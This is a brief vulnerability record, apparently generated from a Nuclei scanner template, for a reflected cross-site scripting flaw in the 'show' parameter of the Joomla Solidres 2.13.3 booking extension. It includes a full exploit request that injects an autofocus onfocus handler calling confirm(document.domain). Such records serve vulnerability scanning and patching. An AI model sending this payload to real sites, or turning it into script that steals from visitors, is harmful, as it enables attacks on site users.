# Vulnerability: Joomla Solidres 2.13.3 - Cross-Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`joomla-solidres-xss.yaml`)

## Description
Joomla extension for Solidres - Online Booking System & Reservation Software is vulnerable to XSS in GET parameter 'show'.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/joomla/greenery_hub/index.php/en/hotels/reservations?location=d2tff&task=hub.search&ordering=score&direction=desc&type_id=0&show=db8ck%22onfocus=%22confirm(document.domain)%22autofocus=%22xwu0k
```

